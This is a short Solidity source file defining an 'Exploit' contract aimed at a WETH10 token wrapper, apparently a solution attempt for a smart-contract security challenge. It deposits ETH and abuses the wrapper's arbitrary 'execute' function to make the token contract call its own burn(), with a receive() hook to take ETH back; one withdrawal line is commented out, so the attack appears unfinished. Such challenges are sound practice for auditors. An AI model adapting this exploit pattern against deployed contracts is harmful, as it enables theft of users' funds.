pragma solidity ^0.8.0;

import {WETH10} from "./WETH10.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {Exploit2} from "./Exploit2.sol";

contract Exploit {
    WETH10 internal weth10;
    Exploit2 internal exploit2;

    constructor(address payable weth10_, address exploit2_) {
        weth10 = WETH10(weth10_);
        exploit2 = Exploit2(exploit2_);
    }

    function attack() external payable {
        weth10.deposit{value: msg.value}();
        //  weth10.withdrawAll();
    }

    function withdrawAll() external {
        weth10.execute(address(weth10), 0, abi.encodeWithSignature("burn()"));
    }

    receive() external payable {
        
    }
}
